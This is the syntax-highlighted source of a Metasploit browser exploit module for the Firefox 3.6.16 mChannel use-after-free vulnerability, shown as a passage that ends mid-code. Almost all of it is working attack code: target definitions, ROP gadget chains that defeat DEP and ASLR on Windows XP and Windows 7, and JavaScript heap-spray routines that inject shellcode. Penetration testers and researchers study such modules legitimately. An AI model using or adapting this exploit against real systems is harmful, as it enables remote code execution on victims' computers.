class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">NormalRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpServer::HTML</span></span><br><span class="line">  <span class="comment">#include Msf::Exploit::Remote::BrowserAutopwn</span></span><br><span class="line">  <span class="comment">#autopwn_info(&#123;</span></span><br><span class="line">  <span class="comment">#  :ua_name =&gt; HttpClients::FF,</span></span><br><span class="line">  <span class="comment">#  :ua_minver =&gt; &quot;3.6.16&quot;,</span></span><br><span class="line">  <span class="comment">#  :ua_maxver =&gt; &quot;3.6.16&quot;,</span></span><br><span class="line">  <span class="comment">#  :os_name =&gt; OperatingSystems::Match::WINDOWS,</span></span><br><span class="line">  <span class="comment">#  :javascript =&gt; true,</span></span><br><span class="line">  <span class="comment">#  :rank =&gt; NormalRanking,</span></span><br><span class="line">  <span class="comment">#&#125;)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;...&#125;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt; [...],</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt; [...],</span><br><span class="line">      <span class="string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;...&#125;,</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span>        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;Space&#x27;</span> =&gt; <span class="number">1024</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line"></span><br><span class="line">          [ <span class="string">&#x27;Automatic&#x27;</span>, &#123; &#125; ],</span><br><span class="line"></span><br><span class="line">          <span class="comment"># DEP bypass</span></span><br><span class="line">          [</span><br><span class="line">            <span class="string">&#x27;Firefox 3.6.16 on Windows XP SP3&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">&#x27;Arch&#x27;</span> =&gt; <span class="variable constant_">ARCH_X86</span>,</span><br><span class="line">              <span class="string">&#x27;Fakevtable&#x27;</span> =&gt; <span class="number">0x0c00</span>,</span><br><span class="line">              <span class="string">&#x27;Fakefunc&#x27;</span> =&gt; <span class="number">0x0c00001c</span>,</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line"></span><br><span class="line">          <span class="comment"># requires JAVA &lt;= JAVA 6 update 26</span></span><br><span class="line">          <span class="comment"># cop stack pivot = ASLR/DEP bypass</span></span><br><span class="line">          [</span><br><span class="line">            <span class="string">&#x27;Firefox 3.6.16 on Windows 7 + Java&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">&#x27;Arch&#x27;</span> =&gt; <span class="variable constant_">ARCH_X86</span>,</span><br><span class="line">              <span class="string">&#x27;Fakevtable&#x27;</span> =&gt; <span class="number">0x1000</span>,</span><br><span class="line">              <span class="string">&#x27;Fakefunc&#x27;</span> =&gt; <span class="number">0x100002a4</span>,</span><br><span class="line">              <span class="string">&#x27;Ppppr&#x27;</span> =&gt; <span class="number">0x7c3410c0</span>,</span><br><span class="line">              <span class="string">&#x27;Retn&#x27;</span> =&gt; <span class="number">0x7c3410c4</span>,</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>,</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2011-05-10&#x27;</span></span><br><span class="line">      ))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">junk</span></span><br><span class="line">    <span class="keyword">return</span> rand_text_alpha(<span class="number">4</span>).unpack(<span class="string">&quot;L&quot;</span>)[<span class="number">0</span>].to_i</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">on_request_uri</span>(<span class="params">cli, request</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Random JavaScript variable names</span></span><br><span class="line">    js_element_name      = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_obj_addr_name     = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_sc_name           = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_ret_addr_name     = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_chunk_name        = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_final_chunk_name  = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_block_name        = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_array_name        = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_retns             = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_applet_name       = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_ppppr             = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line">    js_filler            = rand_text_alpha(rand(<span class="number">10</span>) + <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    agent = request.headers[<span class="string">&#x27;User-Agent&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set target manually or automatically</span></span><br><span class="line">    my_target = target</span><br><span class="line">    <span class="keyword">if</span> my_target.name == <span class="string">&#x27;Automatic&#x27;</span></span><br><span class="line">      <span class="keyword">if</span> agent =~ <span class="regexp">/NT 5\.1/</span> <span class="keyword">and</span> agent =~ <span class="regexp">/Firefox\/3\.6\.16/</span></span><br><span class="line">        my_target = targets[<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">elsif</span> agent =~ <span class="regexp">/NT 6\.1/</span> <span class="keyword">and</span> agent =~ <span class="regexp">/Firefox\/3\.6\.16/</span></span><br><span class="line">        my_target = targets[<span class="number">2</span>]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check for non vulnerable targets</span></span><br><span class="line">    <span class="keyword">if</span> agent !~ <span class="regexp">/NT 5\.1/</span> <span class="keyword">or</span> agent !~ <span class="regexp">/NT 6\.1/</span> <span class="keyword">and</span> agent !~ <span class="regexp">/Firefox\/3\.6\.16/</span></span><br><span class="line">      print_error(<span class="string">&quot;Target not supported: <span class="subst">#&#123;agent&#125;</span>&quot;</span>)</span><br><span class="line">      send_not_found(cli)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Re-generate the payload</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> ((p = regenerate_payload(cli).encoded) == <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> my_target.name =~ <span class="regexp">/Windows 7/</span> <span class="keyword">and</span> <span class="keyword">not</span> request.uri =~ <span class="regexp">/\.html/</span></span><br><span class="line"></span><br><span class="line">      html_trigger = <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&quot;/&quot;</span> == get_resource[-<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">        html_trigger = get_resource[<span class="number">0</span>, get_resource.length - <span class="number">1</span>]</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        html_trigger = get_resource</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      custom_js = <span class="string">&lt;&lt;-JS</span></span><br><span class="line"><span class="string">      function forward() &#123;</span></span><br><span class="line"><span class="string">        window.location = window.location + &quot;<span class="subst">#&#123;html_trigger&#125;</span>.html&quot;;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function start() &#123;</span></span><br><span class="line"><span class="string">        setTimeout(&quot;forward()&quot;, 3500);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      start();</span></span><br><span class="line"><span class="string">      JS</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">if</span> my_target.name =~ <span class="regexp">/Windows XP/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># DEP bypass using xul.dll</span></span><br><span class="line">        rop_gadgets = [</span><br><span class="line">          <span class="number">0x1052c871</span>,  <span class="comment"># mov esp,[ecx] / mov edx,5c86c6ff / add [eax],eax / xor eax,eax / pop esi / retn 0x8 [xul.dll]</span></span><br><span class="line">          junk,        <span class="comment"># junk --------------------------------------------------------------^^</span></span><br><span class="line">          <span class="number">0x7c801ad4</span>,  <span class="comment"># VirtualProtect</span></span><br><span class="line">          junk,        <span class="comment"># junk -------------------------------------------------------------------------^^</span></span><br><span class="line">          junk,        <span class="comment"># junk -------------------------------------------------------------------------^^</span></span><br><span class="line">          <span class="number">0x1003876B</span>,  <span class="comment"># jmp esp</span></span><br><span class="line">          <span class="number">0x0c000040</span>,  <span class="comment"># start address</span></span><br><span class="line">          <span class="number">0x00000400</span>,  <span class="comment"># size 1024</span></span><br><span class="line">          <span class="number">0x00000040</span>,  <span class="comment"># Page EXECUTE_READ_WRITE</span></span><br><span class="line">          <span class="number">0x0c0c0c00</span>,  <span class="comment"># old protection</span></span><br><span class="line">        ].pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">        rop = rop_gadgets</span><br><span class="line"></span><br><span class="line">      <span class="keyword">elsif</span> my_target.name =~ <span class="regexp">/Windows 7/</span> <span class="keyword">and</span> request.uri =~ <span class="regexp">/\.html/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 5 gadgets to pivot using call oriented programming (cop)</span></span><br><span class="line">        <span class="comment"># these instructions are taken from: java.dll, zip.dll and MSVCR71.dll (non aslr)</span></span><br><span class="line">        <span class="comment"># 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]</span></span><br><span class="line">        <span class="comment"># 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]</span></span><br><span class="line">        <span class="comment"># 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]</span></span><br><span class="line">        <span class="comment"># 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)</span></span><br><span class="line">        <span class="comment"># 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN</span></span><br><span class="line"></span><br><span class="line">        rop_pivot = [</span><br><span class="line">          <span class="number">0x6D32280C</span>,  <span class="comment"># 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]</span></span><br><span class="line">          junk,        <span class="comment"># filler</span></span><br><span class="line">          <span class="number">0x6D7E627D</span>,  <span class="comment"># 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)</span></span><br><span class="line">          <span class="number">0x7C3413A4</span>,  <span class="comment"># 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN</span></span><br><span class="line">        ].pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 319</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># rop nops - RETN</span></span><br><span class="line">        rop_pivot &lt;&lt; [<span class="number">0x7c3410c4</span>].pack(<span class="string">&quot;V*&quot;</span>) * <span class="number">0x65</span> <span class="comment">#(0xca-0x65)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># POP r32 / RETN</span></span><br><span class="line">        rop_pivot &lt;&lt; [<span class="number">0x7c3410c3</span>].pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]</span></span><br><span class="line">        rop_pivot &lt;&lt; [<span class="number">0x6D7E5CDA</span>].pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># rop nops - RETN</span></span><br><span class="line">        rop_pivot &lt;&lt; [<span class="number">0x7c3410c4</span>].pack(<span class="string">&quot;V*&quot;</span>) * <span class="number">0xda</span> <span class="comment"># (0x75+0x65)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># POP r32 / RETN</span></span><br><span class="line">        rop_pivot &lt;&lt; [<span class="number">0x7c3410c3</span>].pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]</span></span><br><span class="line">        rop_pivot &lt;&lt; [<span class="number">0x6D325BFC</span>].pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/ &lt;MSVCR71.dll&gt;</span></span><br><span class="line">        rop_gadgets = [</span><br><span class="line">          <span class="number">0x7c346c0a</span>,  <span class="comment"># POP EAX / RETN</span></span><br><span class="line">          <span class="number">0x7c37a140</span>,  <span class="comment"># Make EAX readable</span></span><br><span class="line">          <span class="number">0x7c37591f</span>,  <span class="comment"># PUSH ESP / ... / POP ECX / POP EBP / RETN</span></span><br><span class="line">          junk,        <span class="comment"># EBP (filler)</span></span><br><span class="line">          <span class="number">0x7c346c0a</span>,  <span class="comment"># POP EAX / RETN</span></span><br><span class="line">          <span class="number">0x7c37a140</span>,  <span class="comment"># *&amp;VirtualProtect()</span></span><br><span class="line">          <span class="number">0x7c3530ea</span>,  <span class="comment"># MOV EAX,[EAX] / RETN</span></span><br><span class="line">          <span class="number">0x7c346c0b</span>,  <span class="comment"># Slide, so next gadget would write to correct stack location</span></span><br><span class="line">          <span class="number">0x7c376069</span>,  <span class="comment"># MOV [ECX+1C],EAX / POP EDI / POP ESI / POP EBX / RETN</span></span><br><span class="line">          junk,        <span class="comment"># EDI (filler)</span></span><br><span class="line">          junk,        <span class="comment"># will be patched at runtime (VP), then picked up into ESI</span></span><br><span class="line">          junk,        <span class="comment"># EBX (filler)</span></span><br><span class="line">          <span class="number">0x7c376402</span>,  <span class="comment"># POP EBP / RETN</span></span><br><span class="line">          <span class="number">0x7c345c30</span>,  <span class="comment"># ptr to &#x27;push esp /  ret&#x27;</span></span><br><span class="line">          <span class="number">0x7c346c0a</span>,  <span class="comment"># POP EAX / RETN</span></span><br><span class="line">          <span class="number">0xfffffdff</span>,  <span class="comment"># size 0x00000201 -&gt; ebx</span></span><br><span class="line">          <span class="number">0x7c351e05</span>,  <span class="comment"># NEG EAX / RETN</span></span><br><span class="line">          <span class="number">0x7c354901</span>,  <span class="comment"># POP EBX / RETN</span></span><br><span class="line">          <span class="number">0xffffffff</span>,  <span class="comment"># pop value into ebx</span></span><br><span class="line">          <span class="number">0x7c345255</span>,  <span class="comment"># INC EBX / FPATAN / RETN</span></span><br><span class="line">          <span class="number">0x7c352174</span>,  <span class="comment"># ADD EBX,EAX / XOR EAX,EAX / INC EAX / RETN</span></span><br><span class="line">          <span class="number">0x7c34d201</span>,  <span class="comment"># POP ECX / RETN</span></span><br><span class="line">          <span class="number">0x7c38b001</span>,  <span class="comment"># RW pointer (lpOldProtect) (-&gt; ecx)</span></span><br><span class="line">          <span class="number">0x7c34b8d7</span>,  <span class="comment"># POP EDI / RETN</span></span><br><span class="line">          <span class="number">0x7c34b8d8</span>,  <span class="comment"># ROP NOP (-&gt; edi)</span></span><br><span class="line">          <span class="number">0x7c344f87</span>,  <span class="comment"># POP EDX / RETN</span></span><br><span class="line">          <span class="number">0xffffffc0</span>,  <span class="comment"># value to negate, target value : 0x00000040, target: edx</span></span><br><span class="line">          <span class="number">0x7c351eb1</span>,  <span class="comment"># NEG EDX / RETN</span></span><br><span class="line">          <span class="number">0x7c346c0a</span>,  <span class="comment"># POP EAX / RETN</span></span><br><span class="line">          <span class="number">0x90909090</span>,  <span class="comment"># NOPS (-&gt; eax)</span></span><br><span class="line">          <span class="number">0x7c378c81</span>,  <span class="comment"># PUSHAD / ADD AL,0EF / RETN</span></span><br><span class="line">          <span class="number">0x90909090</span>,  <span class="comment"># NOPS (-&gt; eax)</span></span><br><span class="line">        ].pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">        rop = rop_pivot + rop_gadgets</span><br><span class="line"></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      payload_buf  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">      payload_buf &lt;&lt; rop</span><br><span class="line">      payload_buf &lt;&lt; p</span><br><span class="line">      escaped_payload = <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.to_unescape(payload_buf)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># setup the fake memory references</span></span><br><span class="line">      fakevtable = <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.to_unescape([my_target[<span class="string">&#x27;Fakevtable&#x27;</span>]].pack(<span class="string">&#x27;v&#x27;</span>))</span><br><span class="line">      fakefunc = <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.to_unescape([my_target[<span class="string">&#x27;Fakefunc&#x27;</span>]].pack(<span class="string">&#x27;V*&#x27;</span>))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> my_target.name =~ <span class="regexp">/Windows XP/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># fast loading JS so we dont get the &#x27;unresponsive script&#x27; warning from ff</span></span><br><span class="line">        custom_js = <span class="string">&lt;&lt;-JS</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_element_name&#125;</span> = document.getElementById(&quot;d&quot;);</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_element_name&#125;</span>.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_obj_addr_name&#125;</span> = unescape(&quot;\x00<span class="subst">#&#123;fakevtable&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_sc_name&#125;</span> = unescape(&quot;<span class="subst">#&#123;escaped_payload&#125;</span>&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_ret_addr_name&#125;</span> = unescape(&quot;<span class="subst">#&#123;fakefunc&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">        while(<span class="subst">#&#123;js_ret_addr_name&#125;</span>.length &lt; 0x80) &#123;<span class="subst">#&#123;js_ret_addr_name&#125;</span> += <span class="subst">#&#123;js_ret_addr_name&#125;</span>;&#125;</span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_chunk_name&#125;</span> = <span class="subst">#&#123;js_ret_addr_name&#125;</span>.substring(0,0x18/2);</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_chunk_name&#125;</span> += <span class="subst">#&#123;js_sc_name&#125;</span>;</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_chunk_name&#125;</span> += <span class="subst">#&#123;js_ret_addr_name&#125;</span>;</span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_final_chunk_name&#125;</span> = <span class="subst">#&#123;js_chunk_name&#125;</span>.substring(0,0x10000/2);</span></span><br><span class="line"><span class="string">        while (<span class="subst">#&#123;js_final_chunk_name&#125;</span>.length&lt;0x800000) &#123;<span class="subst">#&#123;js_final_chunk_name&#125;</span> += <span class="subst">#&#123;js_final_chunk_name&#125;</span>;&#125;</span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_block_name&#125;</span> = <span class="subst">#&#123;js_final_chunk_name&#125;</span>.substring(0,0x80000 - <span class="subst">#&#123;js_sc_name&#125;</span>.length - 0x24/2 - 0x4/2 - 0x2/2);</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_array_name&#125;</span> = new Array()</span></span><br><span class="line"><span class="string">        for (n=0;n&lt;0x80;n++)&#123;</span></span><br><span class="line"><span class="string">          <span class="subst">#&#123;js_array_name&#125;</span>[n] = <span class="subst">#&#123;js_block_name&#125;</span> + <span class="subst">#&#123;js_sc_name&#125;</span>;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        JS</span></span><br><span class="line">      <span class="keyword">elsif</span> my_target.name =~ <span class="regexp">/Windows 7/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># setup precision heap spray</span></span><br><span class="line">        ppppr = <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.to_unescape([my_target[<span class="string">&#x27;Ppppr&#x27;</span>]].pack(<span class="string">&#x27;V*&#x27;</span>))</span><br><span class="line">        retns = <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.to_unescape([my_target[<span class="string">&#x27;Retn&#x27;</span>]].pack(<span class="string">&#x27;V*&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fast loading JS so 